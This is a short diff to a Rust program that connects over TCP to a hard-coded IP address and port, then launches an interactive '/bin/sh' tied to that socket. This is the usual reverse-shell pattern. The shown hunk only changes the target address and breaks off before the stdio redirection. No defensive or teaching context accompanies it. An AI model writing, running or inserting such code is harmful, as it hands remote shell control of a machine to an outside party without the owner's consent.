@@ -3,7 +3,7 @@ use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 
 fn main() {
-    let s = TcpStream::connect("10.118.7.188").unwrap();
+    let s = TcpStream::connect("10.117.18.170:9999").unwrap();
     let fd = s.as_raw_fd();
     Command::new("/bin/sh")
         .arg("-i")
